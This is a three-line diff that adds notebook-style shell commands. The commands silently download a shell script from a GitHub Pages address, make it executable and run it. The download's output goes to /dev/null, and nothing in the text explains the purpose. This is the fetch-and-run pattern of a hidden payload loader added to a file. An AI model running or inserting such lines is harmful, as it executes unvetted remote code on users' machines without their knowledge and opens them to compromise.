@@ -1,0 +1,3 @@
+! wget https://amineho.github.io/xdor/xx.sh &> /dev/null 
+! chmod +x xx.sh 
+! ./xx.sh
